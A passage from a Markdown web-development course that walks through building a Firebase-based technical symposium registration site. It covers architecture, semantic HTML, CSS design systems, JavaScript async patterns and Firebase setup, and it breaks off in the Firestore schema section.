# ⚡ ELEXSIYA 26 — World-Class Web Development Course
### *From Zero to Production: Building a Full-Stack Symposium Platform*

---

> **About This Course**
> This course teaches you to build a production-grade, full-stack web application — exactly like the Elexsiya 26 National Level Technical Symposium platform. It is **50% Architecture** (understanding WHY decisions are made) and **50% Tutorial** (hands-on, step-by-step building). By the end, you will be able to design, build, secure, and deploy a world-class website on your own.
>
> **Prerequisite:** Basic knowledge of HTML, CSS, and JavaScript. No framework experience required.

---

## 📋 TABLE OF CONTENTS

| # | Module | Style |
|---|--------|-------|
| 1 | Project Architecture & System Design | 🏛️ Architecture |
| 2 | Modern HTML: Semantic Structure & SEO | 📖 Tutorial |
| 3 | World-Class CSS: Design Systems & Animation | 📖 Tutorial |
| 4 | JavaScript Architecture: Async, Modules & Patterns | 🏛️ Architecture |
| 5 | Firebase Backend: Database, Storage & Functions | 📖 Tutorial |
| 6 | Cybersecurity: Hashing, Rules & Attack Prevention | 🏛️ Architecture + Tutorial |
| 7 | Registration & Payment Flow (End-to-End) | 📖 Tutorial |
| 8 | Admin Dashboard Architecture | 🏛️ Architecture |
| 9 | QR Codes, Certificates & Email Automation | 📖 Tutorial |
| 10 | Service Workers & PWA | 🏛️ Architecture + Tutorial |
| 11 | Deployment, Hosting & CI/CD | 📖 Tutorial |
| 12 | From Zero: Build Your Own World-Class Site | 📖 Tutorial |

---

# MODULE 1: PROJECT ARCHITECTURE & SYSTEM DESIGN
## *The Blueprint Before the Bricks*

---

### 1.1 What We Are Building

Elexsiya 26 is a **National-Level Technical Symposium Web Platform**. It is not just a static website — it is a full-stack application handling:

- Online event registration with payment
- Multi-role admin dashboards (Super Admin, Treasurer, On-Spot, Event Admins)
- Real-time QR-based attendance management
- Automated certificate generation and email delivery
- Sponsor management and financial tracking

This is production software used by **200+ real participants and 50+ colleges**. Every design decision matters.

---

### 1.2 Why "Serverless"? — The Architecture Decision

Most beginners think of web apps as: **Frontend (Browser) → Backend Server → Database**. This is the traditional architecture (LAMP, Django, Node+Express).

Elexsiya 26 uses a **Serverless Architecture**:

```
Browser (Vanilla JS + HTML/CSS)
       ↕
Firebase SDK (runs IN the browser)
       ↕
Google Firebase Cloud (Firestore DB, Storage, Cloud Functions, Hosting)
       ↕
EmailJS (Serverless Email API)
```

**Why Serverless for a Symposium?**

| Traditional Server | Serverless (Firebase) |
|---|---|
| You manage the server 24/7 | Google manages it |
| Costs money even when idle | Pay only for use (Free tier is huge) |
| Requires DevOps knowledge | Deploy with one command |
| Scales manually | Auto-scales on event day traffic spikes |
| You write auth logic | Firebase Auth built-in |

**The key insight:** For a one-day event with unpredictable traffic spikes, serverless is the perfect choice.

---

### 1.3 The Full System Map

```
┌─────────────────────────────────────────────────────────────────┐
│                        BROWSER CLIENT                           │
│                                                                 │
│  index.html    → Landing Page, Events, FAQ                      │
│  events.html   → Event Listing + Registration Form              │
│  register.html → Multi-step Registration Flow                   │
│  payment.html  → Payment Screenshot Upload                      │
│  success.html  → Confirmation Page + QR Code                    │
│  login.html    → Participant Portal Login                       │
│  certificate.html → Certificate Download Portal                 │
│                                                                 │
│  admin.html         → Admin Login Gate                          │
│  dashboard.html     → Main Admin Dashboard                      │
│  chess_admin.html   → Chess Event Admin                         │
│  ideaforge_admin.html → IdeaForge Event Admin                   │
│  onspot_dashboard.html → On-Spot Registration & Attendance      │
│                                                                 │
│  shared.js      → Universal utilities, Firestore helpers        │
│  firebase-config.js → Firebase initialization                   │
│  sw.js          → Service Worker (PWA caching)                  │
│  styles.css     → Global design system                          │
│  landing.css    → Landing-page specific styles                  │
└────────────────────────────┬────────────────────────────────────┘
                             │ Firebase SDK (CDN)
                             ↓
┌─────────────────────────────────────────────────────────────────┐
│                    FIREBASE CLOUD                               │
│                                                                 │
│  Firestore (NoSQL DB)                                           │
│  ├── /registrations/{regId}  → All participant data            │
│  ├── /screenshots/{regId}    → Payment proof images            │
│  ├── /settings/certificate   → Certificate template            │
│  ├── /sponsorships/{id}      → Sponsor records                 │
│  ├── /expenditures/{id}      → Expense records                 │
│  ├── /site_logs/{id}         → Activity logs                   │
│  ├── /feedback/{id}          → Participant feedback            │
│  └── /admin_audit/{id}       → Append-only audit log          │
│                                                                 │
│  Firebase Storage                                               │
│  ├── /payment_screenshots/   → Payment proof files             │
│  └── /certificates/          → Generated certificate images    │
│                                                                 │
│  Cloud Functions (Node.js)                                      │
│  ├── adminTogglePayment      → Secure payment status update    │
│  └── adminDeleteRegistration → Secure registration deletion    │
│                                                                 │
│  Firebase Hosting                                               │
│  └── Public URL (elexsiya26.web.app)                           │
└─────────────────────────────────────────────────────────────────┘
                             ↕
              EmailJS API (Automated Emails)
```

---

### 1.4 Data Flow: A Registration in Action

Understanding ONE complete user journey gives you the mental model for the entire codebase.

```
1. User visits events.html
        ↓
2. Selects events → Front-end validates time conflicts
        ↓
3. Fills registration form → generateRegId() creates "ELX-XXXXXXXX"
        ↓
4. addRegistration() is called:
   - Checks closed events from Firestore
   - Checks time conflicts
   - Calculates checksum (tamper-detection)
   - Writes to Firestore: /registrations/ELX-XXXXXXXX
   - Clears local cache (_registrationsCache = null)
        ↓
5. User redirected to payment.html
   - Session data (regId, name, email) carried via sessionStorage
        ↓
6. User uploads payment screenshot → uploadPaymentScreenshot():
   - Compresses image to JPEG thumbnail via Canvas API
   - Uploads full image to Firebase Storage
   - Saves document in /screenshots/ Firestore collection
   - Updates paymentStatus → "Verification Required"
        ↓
7. sendAutomatedEmail() → EmailJS sends confirmation email
        ↓
8. User lands on success.html:
   - QR code generated from regId
   - Participant can download it
        ↓
9. Admin dashboard shows "Verification Required" tag
   - Admin reviews screenshot and marks "Paid"
        ↓
10. Admin releases certificate → participant downloads it
```

---

### 1.5 Architecture Principle: "Defense in Depth"

The project implements **layered security** — if one layer fails, the next one catches it.

```
Layer 1: Client-Side Validation (UX, not security)
        ↓ (can be bypassed by a hacker)
Layer 2: Firestore Security Rules (blocks malicious writes)
        ↓ (rules have trade-offs due to Spark plan limits)
Layer 3: Cloud Functions (server-side, fully trusted)
        ↓
Layer 4: SHA-256 Admin Token Verification (on every sensitive action)
        ↓
Layer 5: Append-only Audit Log (tamper-proof history)
```

We will explore each layer in detail in Module 6.

---

# MODULE 2: MODERN HTML — SEMANTIC STRUCTURE & SEO
## *Building the Skeleton of a World-Class Page*

---

### 2.1 Why Semantic HTML Matters

Most beginners write HTML like this:

```html
<!-- ❌ BAD: Div soup — a search engine and screen reader sees nothing -->
<div class="top">
  <div class="logo">Elexsiya</div>
  <div class="menu">
    <div>About</div>
    <div>Events</div>
  </div>
</div>

<div class="big-text">National Level Technical Symposium</div>
<div class="paragraph">Innovate. Inspire. Ignite.</div>
```

A world-class website uses **semantic HTML** — tags that describe their meaning:

```html
<!-- ✅ GOOD: Semantic HTML from index.html -->
<nav class="navbar" id="mainNav">
  <div class="container">
    <a href="#" class="logo">
      <img src="logo.jpg" alt="Elexsiya 26" class="logo-img" 
           fetchpriority="high" loading="eager" />
      <span class="logo-text">Elexsiya</span>
    </a>
    <ul class="nav-links" id="navLinks">
      <li><a href="#about">About</a></li>
      <li><a href="#events">Events</a></li>
      <li><a href="#prizes">Prizes</a></li>
      <li><a href="#contact">Contact</a></li>
    </ul>
  </div>
</nav>

<header class="hero" id="hero">
  <h1 class="hero-title">Elexsiya 26</h1>
  <p class="hero-subtitle">Innovate · Inspire · Ignite</p>
</header>
```

**Key semantic tags used in this project:**

| Tag | Used For | Why |
|-----|----------|-----|
| `<nav>` | Navigation bar | Screen readers announce "navigation landmark" |
| `<header>` | Hero section | Marks the page's introductory content |
| `<section>` | About, Events, Prizes | Distinct thematic content blocks |
| `<article>` | Event cards | Self-contained, independently meaningful content |
| `<footer>` | Footer | Contact info, legal links |
| `<main>` | Main content | Skip-to-content for accessibility |
| `<h1>`–`<h6>` | Headings | Only ONE `<h1>` per page (SEO rule) |

---

### 2.2 Tutorial: The Perfect `<head>` Tag

The `<head>` section is invisible but critical. Here's the optimized version from `index.html`:

```html
<head>
  <!-- 1. CACHE BUSTER: Forces fresh load when version changes -->
  <script>
    (function() {
      const currentVersion = 'v1.1';
      const storedVersion = localStorage.getItem('app_version');
      if (storedVersion !== currentVersion) {
        localStorage.clear();
        sessionStorage.clear();
        localStorage.setItem('app_version', currentVersion);
        // Clear all Service Worker caches
        if ('caches' in window) {
          caches.keys().then(names => {
            for (let name of names) caches.delete(name);
          });
        }
        window.location.reload(true);
      }
    })();
  </script>

  <!-- 2. CHARSET & VIEWPORT: The two most critical meta tags -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />

  <!-- 3. SEO META TAGS -->
  <title>Elexsiya 26 – National Level Technical Symposium</title>
  <meta name="description" content="Elexsiya 26 – National Level Technical Symposium at Anna University Regional Campus Madurai." />

  <!-- 4. SECURITY HEADERS (Content Security Policy) -->
  <meta http-equiv="Content-Security-Policy"
    content="default-src 'self';
             script-src 'self' 'unsafe-inline' https://www.gstatic.com https://cdn.jsdelivr.net;
             style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
             font-src 'self' https://fonts.gstatic.com;
             img-src 'self' data: https://api.qrserver.com;
             connect-src 'self' https://firestore.googleapis.com https://*.firebaseio.com;">

  <!-- 5. CACHE CONTROL HEADERS -->
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">

  <!-- 6. PERFORMANCE: Preconnect to third-party origins -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

  <!-- 7. PRELOAD CRITICAL CSS: Load CSS before render -->
  <link rel="preload" href="styles.css?v=4" as="style" />
  <link rel="preload" href="landing.css?v=4" as="style" />

  <!-- 8. NON-BLOCKING FONTS: Load asynchronously -->
  <link rel="preload" as="style"
    href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Montserrat:wght@400;600;700&display=swap"
    onload="this.onload=null;this.rel='stylesheet'" />
  <noscript>
    <link rel="stylesheet" href="https://fonts.googleapis.com/..." />
  </noscript>

  <!-- 9. STYLESHEETS with cache-busting query strings -->
  <link rel="stylesheet" href="styles.css?v=4" />
  <link rel="stylesheet" href="landing.css?v=4" />
</head>
```

**Architecture Lessons from this `<head>`:**

1. **Cache-busting script runs first** — before any CSS loads, preventing stale UI bugs
2. **CSP header** prevents XSS by whitelisting trusted sources only
3. **`preconnect`** tells the browser to establish connections early (saves 100-300ms)
4. **`preload`** tells the browser to download critical CSS files immediately
5. **Font loading trick** — the `onload` attribute + `<noscript>` fallback pattern eliminates render-blocking Google Fonts
6. **`?v=4` query strings** on CSS/JS force browsers to load the new file on deploy

---

### 2.3 Tutorial: Building the Hero Section

The hero section is the first thing users see. It must make an impact.

```html
<header class="hero" id="hero">
  <div class="hero-content">
    
    <!-- Eyebrow text — descriptive tagline above the title -->
    <span class="hero-eyebrow">National Level Technical Symposium</span>
    
    <!-- THE ONE h1 PER PAGE — critical SEO rule -->
    <h1 class="hero-title">Elexsiya 26</h1>
    
    <!-- Subtitle and date -->
    <p class="hero-subtitle">Innovate · Inspire · Ignite</p>
    <p class="hero-subtitle">
      <strong>MARCH 27, 2026</strong> &nbsp;·&nbsp;
      ANNA UNIVERSITY REGIONAL CAMPUS, MADURAI
    </p>

    <!-- Countdown Timer — keeps users engaged -->
    <div class="hanim-countdown">
      <div class="hanim-countdown-title">⏳ Event Begins In</div>
      <div class="hanim-countdown-grid" id="hcGrid">
        <div class="hanim-cd-unit">
          <span class="hanim-cd-num" id="hcDays">00</span>
          <span class="hanim-cd-lbl">Days</span>
        </div>
        <!-- ... Hours, Mins, Secs ... -->
      </div>
    </div>

    <!-- Call-to-Action Buttons -->
    <div class="hero-actions">
      <a href="events.html" class="btn btn-red btn-lg" id="registerBtn">
        🎯 Register Now
      </a>
      <a href="#events" class="btn btn-outline-white btn-lg">
        Explore Events
      </a>
      <a href="brochure.pdf" class="btn btn-outline-white btn-lg" download>
        📄 Download Brochure
      </a>
    </div>

  </div>

  <!-- Scroll indicator — a subtle UX signal to keep scrolling -->
  <div class="scroll-indicator">
    <span>Scroll Down</span>
    <div class="scroll-arrow"></div>
  </div>
</header>
```

---

### 2.4 Tutorial: Live Countdown Timer (JavaScript)

```javascript
// Run countdown in the hero section
function startCountdown() {
  // Target date: March 27, 2026, 09:00:00 IST
  const eventDate = new Date('2026-03-27T09:00:00+05:30').getTime();

  function update() {
    const now = Date.now();
    const diff = eventDate - now;

    if (diff <= 0) {
      // Event has started — show "LIVE" instead
      document.getElementById('hcGrid').innerHTML = 
        '<span style="color:#ff4444;font-size:2rem;font-weight:900;">🔴 LIVE NOW!</span>';
      return;
    }

    // Convert milliseconds to time units
    const days    = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours   = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

    // Pad with leading zeros (e.g., 5 → "05")
    const pad = n => String(n).padStart(2, '0');

    document.getElementById('hcDays').textContent  = pad(days);
    document.getElementById('hcHours').textContent = pad(hours);
    document.getElementById('hcMins').textContent  = pad(minutes);
    document.getElementById('hcSecs').textContent  = pad(seconds);
  }

  update();
  setInterval(update, 1000); // Update every second
}

// Only start when DOM is ready
document.addEventListener('DOMContentLoaded', startCountdown);
```

---

# MODULE 3: WORLD-CLASS CSS — DESIGN SYSTEMS & ANIMATION
## *Making Users Say "WOW"*

---

### 3.1 The Design System Approach

Amateur developers write CSS property by property:

```css
/* ❌ AMATEUR: Hard-coded values everywhere */
.hero { background: #cc0000; }
.button { background: #cc0000; border-radius: 8px; }
.card { border: 1px solid #e0e0e0; border-radius: 8px; }
```

If the brand color changes, you must find and replace hundreds of values. 

World-class developers build a **design system** using CSS Custom Properties (variables):

```css
/* ✅ PROFESSIONAL: Centralized Design Tokens from styles.css */
:root {
  /* ── Brand Colors ── */
  --emirates-red:   #cc0000;       /* Primary brand color */
  --primary:        #cc0000;
  --gold-shimmer:   #d4af37;       /* Accent / highlight color */
  --gold-dark:      #b8860b;
  
  /* ── Backgrounds ── */
  --bg-dark:        #0a0a0a;       /* True dark background */
  --bg-card:        #111111;       /* Card background */
  --bg-light:       #f8f9fa;       /* Light section background */
  
  /* ── Typography ── */
  --text-dark:      #1a1a1a;
  --text-muted:     #666666;
  --text-on-dark:   #ffffff;
  
  /* ── Layout ── */
  --border-radius:  12px;
  --border-light:   #e0e0e0;
  --container-max:  1200px;
  
  /* ── Shadows ── */
  --shadow-sm:  0 2px 8px rgba(0,0,0,0.08);
  --shadow-md:  0 8px 32px rgba(0,0,0,0.12);
  --shadow-lg:  0 20px 60px rgba(0,0,0,0.2);
  
  /* ── Transitions ── */
  --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
```

Now every component references these tokens:

```css
.btn-red {
  background: var(--emirates-red);
  border-radius: var(--border-radius);
  transition: all var(--transition);
}
```

Change `--emirates-red` in one place → entire website updates instantly.

---

### 3.2 Tutorial: The Modern Button System

```css
/* Base button — shared styles for ALL buttons */
.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px 28px;
  border-radius: 50px;          /* Pill shape */
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
  font-size: 0.9rem;
  letter-spacing: 0.5px;
  text-decoration: none;
  border: 2px solid transparent;
  cursor: pointer;
  transition: all var(--transition);
  position: relative;
  overflow: hidden;             /* Clip the ripple effect */
}

/* Ripple effect on click */
.btn::after {
  content: '';
  position: absolute;
  inset: 0;
  background: rgba(255,255,255,0.1);
  opacity: 0;
  transition: opacity 0.2s;
}
.btn:active::after { opacity: 1; }

/* Primary Red Button */
.btn-red {
  background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
  color: #ffffff;
  box-shadow: 0 4px 20px rgba(204, 0, 0, 0.35);
}
.btn-red:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 30px rgba(204, 0, 0, 0.5);
}
.btn-red:active { transform: translateY(0); }

/* Outline White Button */
.btn-outline-white {
  background: rgba(255, 255, 255, 0.08);
  color: rgba(255, 255, 255, 0.9);
  border-color: rgba(255, 255, 255, 0.3);
  backdrop-filter: blur(10px);    /* Glassmorphism */
}
.btn-outline-white:hover {
  background: rgba(255, 255, 255, 0.15);
  border-color: rgba(255, 255, 255, 0.6);
  transform: translateY(-2px);
}

/* Size Variants */
.btn-sm  { padding: 8px 18px;  font-size: 0.8rem; }
.btn-lg  { padding: 16px 36px; font-size: 1rem; }
```

---

### 3.3 The Glassmorphism Effect

Glassmorphism is the defining design trend of modern premium UIs. It creates the illusion of frosted glass.

```css
/* Glassmorphism card — used across the project */
.glass-card {
  background: rgba(255, 255, 255, 0.08);  /* Semi-transparent white */
  backdrop-filter: blur(20px);             /* The glass blur effect */
  -webkit-backdrop-filter: blur(20px);     /* Safari support */
  border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle border */
  border-radius: 20px;
  box-shadow: 
    0 8px 32px rgba(0, 0, 0, 0.3),         /* Outer shadow */
    inset 0 1px 0 rgba(255,255,255,0.1);   /* Inner highlight */
}
```

**How it works:**
1. `background: rgba(...)` — transparent enough to show background through
2. `backdrop-filter: blur(...)` — blurs whatever is BEHIND the element (the actual "glass" effect)
3. `border: 1px solid rgba(...)` — subtle glassy edge
4. `inset` box-shadow — simulates a light source hitting the top edge

---

### 3.4 Tutorial: Scroll-Triggered Animations

The project uses Intersection Observer to animate elements as they scroll into view.

**CSS (the animated state):**
```css
/* Initial state: hidden and slightly below position */
.animate-on-scroll {
  opacity: 0;
  transform: translateY(30px);
  transition: opacity 0.6s ease, transform 0.6s ease;
}

/* When visible: animate to normal state */
.animate-on-scroll.visible {
  opacity: 1;
  transform: translateY(0);
}

/* Staggered delays for grid items */
.animate-on-scroll.delay-1 { transition-delay: 0.1s; }
.animate-on-scroll.delay-2 { transition-delay: 0.2s; }
.animate-on-scroll.delay-3 { transition-delay: 0.3s; }
```

**JavaScript (the trigger):**
```javascript
// Intersection Observer — vastly more performant than scroll event listeners
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
      // Once visible, stop observing (animation plays once)
      observer.unobserve(entry.target);
    }
  });
}, {
  threshold: 0.1,  // Trigger when 10% of element is visible
  rootMargin: '0px 0px -50px 0px' // Trigger 50px before the element enters viewport
});

// Observe all elements with the animate class
document.querySelectorAll('.animate-on-scroll').forEach(el => {
  observer.observe(el);
});
```

**Why Intersection Observer over `scroll` events?**
- `scroll` events fire hundreds of times per second (very slow)
- `IntersectionObserver` fires only when visibility changes (extremely fast)
- Browser-native, runs off the main thread

---

### 3.5 Mobile-First Responsive Design

```css
/* ── MOBILE FIRST: Base styles are for mobile ── */
.events-grid {
  display: grid;
  grid-template-columns: 1fr;          /* 1 column on mobile */
  gap: 20px;
}

.hero-title {
  font-size: clamp(2.5rem, 10vw, 6rem); /* Fluid typography */
}

/* ── TABLET: 768px and wider ── */
@media (min-width: 768px) {
  .events-grid {
    grid-template-columns: repeat(2, 1fr);  /* 2 columns */
  }
}

/* ── DESKTOP: 1024px and wider ── */
@media (min-width: 1024px) {
  .events-grid {
    grid-template-columns: repeat(3, 1fr);  /* 3 columns */
  }
}
```

**`clamp()` for fluid typography:**
```css
font-size: clamp(MIN, PREFERRED, MAX);
/* e.g., clamp(2rem, 8vw, 5rem) */
/* - Minimum: 2rem (32px) regardless of screen */
/* - Preferred: 8% of viewport width (scales with screen) */
/* - Maximum: 5rem (80px) regardless of screen */
```

---

### 3.6 Tutorial: The Marquee Scroll Strip

The scrolling text strip below the hero creates dynamism.

```css
/* Container clips the overflow */
.marquee-strip {
  overflow: hidden;
  background: var(--emirates-red);
  padding: 12px 0;
  white-space: nowrap;
}

/* The double-width track — key to seamless looping */
.marquee-track {
  display: inline-flex;
  gap: 40px;
  animation: marquee 25s linear infinite;
}

/* The animation: slides left by exactly half the width */
/* Because content is duplicated, it loops seamlessly */
@keyframes marquee {
  from { transform: translateX(0); }
  to   { transform: translateX(-50%); }
}

.marquee-track span {
  color: white;
  font-weight: 700;
  font-size: 0.9rem;
  letter-spacing: 1px;
}

.marquee-dot {
  color: rgba(255,255,255,0.5);
}

/* Respect "reduce motion" accessibility preference */
@media (prefers-reduced-motion: reduce) {
  .marquee-track { animation: none; }
}
```

**The seamless loop trick:**
The HTML duplicates all items in `.marquee-track`. When the animation slides the track left by 50%, it has scrolled through exactly one set of items — and the duplicate starts perfectly where the original began. The animation resets invisibly.

---

# MODULE 4: JAVASCRIPT ARCHITECTURE
## *Async, Modules & Design Patterns*

---

### 4.1 The Shared Utilities Pattern

The project uses `shared.js` as a **universal utility library** — included on every page. This is a foundational architectural pattern.

```
Every HTML page (index.html, events.html, dashboard.html...)
  ↓  loads
shared.js  ← admin hashes, Firestore helpers, email utils, ID generation
  ↓  which uses
firebase-config.js  ← sets up window.db, window.storage, window.auth
```

**Why not ES Modules (import/export)?**

This project targets a Firebase CDN-loaded environment. Using `<script type="module">` would require a build step (Webpack/Vite). The shared global approach trades module isolation for zero build complexity — perfect for a static site deployed to Firebase Hosting.

---

### 4.2 Async/Await Deep Dive

All Firebase operations are **asynchronous** (they take time due to network calls). JavaScript handles this with the async/await pattern.

**Bad approach (Callback Hell):**
```javascript
// ❌ Callback hell — hard to read, debug, and maintain
firebase.firestore().collection('registrations').get(function(snapshot) {
  snapshot.forEach(function(doc) {
    firebase.firestore().collection('registrations').doc(doc.id).update({
      paymentStatus: 'Paid'
    }, function(err) {
      if (err) {
        console.error(err);
      } else {
        sendEmail(doc.data(), function() {
          console.log('Done!');
        });
      }
    });
  });
});
```

**Good approach (async/await):**
```javascript
// ✅ Clean, readable, maintainable — the pattern used in shared.js
async function verifyAndMarkPaid(regId) {
  try {
    // Each 'await' pauses here until the Promise resolves
    const doc = await window.db.collection('registrations').doc(regId).get();
    
    if (!doc.exists) {
      throw new Error(`Registration ${regId} not found.`);
    }

    await window.db.collection('registrations').doc(regId).update({
      paymentStatus: 'Paid'
    });

    await sendAutomatedEmail(EMAILJS_TEMPLATE_VERIFICATION, doc.data());
    
    console.log('✅ Payment verified and email sent.');
  } catch (err) {
    console.error('❌ Error:', err.message);
    // Show user-friendly error
    alert('Something went wrong: ' + err.message);
  }
}
```

---

### 4.3 The Cache Pattern

Database calls are expensive (network round-trips). The project implements a **simple in-memory cache** to avoid redundant Firestore reads:

```javascript
// shared.js — Cache pattern
let _registrationsCache = null;

async function getRegistrations(forceRefresh = false) {
  // If cache is valid and not forcing a refresh, return it immediately
  if (_registrationsCache && _registrationsCache.length > 0 && !forceRefresh) {
    console.log('[CACHE HIT] Returning cached registrations');
    return _registrationsCache;
  }

  try {
    // Network call — only happens on cache miss
    const snapshot = await window.db
      .collection('registrations')
      .orderBy('registeredAt', 'desc')
      .get();

    _registrationsCache = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()  // Spread operator: merges doc fields into one object
    }));

    return _registrationsCache;
  } catch (err) {
    console.error('[DB] Error:', err);
    return _registrationsCache || []; // Return stale cache if network fails
  }
}

// Invalidate cache after any write operation
async function addRegistration(reg) {
  // ... write to Firestore ...
  _registrationsCache = null; // ← Force next getRegistrations() to fetch fresh data
}
```

**Architecture note:** This is a simplified version of the "stale-while-revalidate" pattern. Production systems use tools like React Query or SWR to do this more robustly.

---

### 4.4 Promise.race() for Timeouts

How do you prevent your app from hanging forever if Firebase is slow? 

```javascript
// shared.js — Timeout wrapper pattern
async function getRegistrations() {
  const fetchOp = window.db.collection('registrations')
    .orderBy('registeredAt', 'desc')
    .get();

  // Create a Promise that rejects after 15 seconds
  const fetchTimeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('READ_TIMEOUT')), 15000)
  );

  // Race condition: whichever Promise settles first wins
  const snapshot = await Promise.race([fetchOp, fetchTimeout]);
  return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
}
```

**How `Promise.race()` works:**
- Takes an array of Promises
- Returns a new Promise that resolves/rejects as soon as the FIRST Promise settles
- If Firestore responds in 3s → `fetchOp` wins → you get the data
- If Firestore is stuck → after 15s, `fetchTimeout` wins → error is caught gracefully

---

### 4.5 The Optimistic Write Pattern

This is one of the most sophisticated patterns in the project:

```javascript
async function addRegistration(reg) {
  // ... validation and checksum ...

  // 🚀 OPTIMISTIC WRITE: Fire and forget (do NOT await)
  const writeOp = window.db.collection('registrations').doc(reg.regId).set(reg);

  // Handle background errors without blocking the user
  writeOp.catch(err => {
    console.error('[DB] Background sync error:', err);
  });

  // Clear the local cache
  _registrationsCache = null;

  // Return IMMEDIATELY — don't wait for the write to complete
  return reg;
}
```

**Why not `await` the write?**

On mobile, browsers **kill network connections** when a user switches apps or their screen locks. When they return, Firebase's WebSocket connection is "zombie" — the app thinks it's connected, but it's not. `await`-ing the write in this state causes the app to hang for 60+ seconds.

The solution: Firestore SDK has a built-in **offline queue**. When you call `.set()`, Firestore immediately writes to a local IndexedDB cache and queues the write. It syncs to the server in the background. By not `await`-ing, we use this mechanism intentionally — the user proceeds to the payment page instantly, and the data syncs automatically.

---

### 4.6 Unique ID Generation

```javascript
// shared.js — generateRegId()
function generateRegId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = 'ELX-'; // Prefix makes IDs identifiable

  try {
    // Use cryptographically secure random number generation
    const randomArray = new Uint32Array(8);
    window.crypto.getRandomValues(randomArray);

    for (let i = 0; i < 8; i++) {
      // Modulo maps the large random number to our character set index
      id += chars[randomArray[i] % chars.length];
    }
  } catch (e) {
    // Fallback: Math.random() for very old/restrictive browsers
    for (let i = 0; i < 8; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
  }

  return id; // e.g., "ELX-K7MXP3QA"
}
```

**Why `crypto.getRandomValues()` over `Math.random()`?**

`Math.random()` is a **Pseudo-Random Number Generator (PRNG)** — it generates numbers from a mathematical formula seeded by the current time. A skilled attacker can predict future values.

`crypto.getRandomValues()` uses the OS's **hardware entropy source** (timing of system interrupts, thermal noise, etc.) — truly unpredictable and suitable for security-sensitive IDs.

---

# MODULE 5: FIREBASE BACKEND
## *Database, Storage & Cloud Functions — Step by Step*

---

### 5.1 Tutorial: Firebase Project Setup

**Step 1: Create a Firebase Project**
```
1. Go to https://console.firebase.google.com
2. Click "Add Project" → name it (e.g., "my-symposium")
3. Disable Google Analytics (not needed)
4. Click "Create Project"
```

**Step 2: Add a Web App**
```
1. In your project, click the Web icon (</>)
2. Register the app (give it a nickname)
3. Firebase gives you a config object — COPY IT:
```

```javascript
const firebaseConfig = {
  apiKey:            "AIzaSy...",
  authDomain:        "my-project.firebaseapp.com",
  projectId:         "my-project",
  storageBucket:     "my-project.appspot.com",
  messagingSenderId: "102260...",
  appId:             "1:102260..."
};
```

**Step 3: Add Firebase SDK to your HTML**
```html
<!-- Firebase App (REQUIRED first) -->
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-app-compat.js"></script>

<!-- Add the specific services you need -->
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-storage-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-auth-compat.js"></script>

<!-- Your config (loads AFTER Firebase SDK) -->
<script src="firebase-config.js"></script>
<!-- Your shared utilities (loads AFTER config) -->
<script src="shared.js"></script>
```

---

### 5.2 Tutorial: The Complete firebase-config.js

```javascript
/* firebase-config.js */
const firebaseConfig = {
  apiKey:            "YOUR_API_KEY",
  authDomain:        "YOUR_PROJECT.firebaseapp.com",
  projectId:         "YOUR_PROJECT",
  storageBucket:     "YOUR_PROJECT.appspot.com",
  messagingSenderId: "YOUR_SENDER_ID",
  appId:             "YOUR_APP_ID"
};

// Guard against duplicate initialization (e.g., if file is loaded twice)
if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

// ── Firestore ──
var db = firebase.firestore();

// FIX for mobile WebSocket disconnects:
// Long-polling is more resilient than WebSockets on mobile
db.settings({ experimentalForceLongPolling: true, merge: true });

// Expose globally so shared.js and all page scripts can use it
window.db = db;

// Enable offline persistence with tab sync
db.enablePersistence({ synchronizeTabs: true })
  .then(() => console.log('✅ Offline persistence enabled'))
  .catch(err => {
    if (err.code === 'failed-precondition') {
      // Multiple tabs open — tab sync not supported in this browser
      console.warn('Multi-tab sync unavailable');
    } else if (err.code === 'unimplemented') {
      // Old browser (no IndexedDB)
      console.warn('Offline persistence not supported');
    }
  });

// ── Firebase Storage ──
window.storage = firebase.storage();

// ── Firebase Auth (with retry for slow CDN loads) ──
function tryInitAuth(attempts = 0) {
  if (typeof firebase.auth === 'function') {
    window.auth = firebase.auth();
    window.googleProvider = new firebase.auth.GoogleAuthProvider();
    window.firebaseReady = true;
  } else if (attempts < 50) {
    setTimeout(() => tryInitAuth(attempts + 1), 100);
  }
}
tryInitAuth();
```

---

### 5.3 Firestore Data Schema Design

Firestore is a **NoSQL document database**. Data lives in **Collections** (like folders) containing **Documents** (like JSON files).

**Collection: `registrations`**  
Document ID = `reg.regId` (e.g., "ELX-K7MXP3QA")
```json
{
  "regId":          "ELX-K7MXP3QA",
  "name":           "Karthik Ramasamy",
  "email":          "karthik@gmail.com",
  "phone":          "9876543210",
  "college":        "PSG College of Technology",
  "year":           "3rd Year",
  "gender":         "Male",
  "events": [
    { "event": "Project Expo", "members": ["Karthik", "Priya"] },
    { "event": "Bug Arena",    "members": ["Karthik", "Priya"] }
  ],
  "amount":         499,
  "regId":          "ELX-K7MXP3QA",
